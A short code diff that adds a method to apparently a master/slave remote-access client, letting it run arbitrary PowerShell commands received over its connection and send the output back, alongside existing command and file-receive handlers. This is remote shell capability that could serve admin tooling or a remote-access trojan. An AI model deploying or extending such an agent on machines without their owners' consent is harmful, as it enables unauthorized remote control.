@@ -57,6 +57,11 @@ class Commands:
         output = res.stdout.read().decode('utf-8')
         self.slave.send_dict({'cmd_output': output})
     
+    def powershell(self, msg):
+        res = sp.Popen(msg['command_string'], shell=True, stdout=sp.PIPE, stderr=sp.PIPE, executable=r'C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe')
+        output = res.stdout.read().decode('utf-8')
+        self.slave.send_dict({'powershell_output': output})
+    
     def recieve_file(self, msg):
         destination_path = msg['destination_path']
         destination_path = Path(__file__).parent.joinpath('inbox') if destination_path is None else destination_path
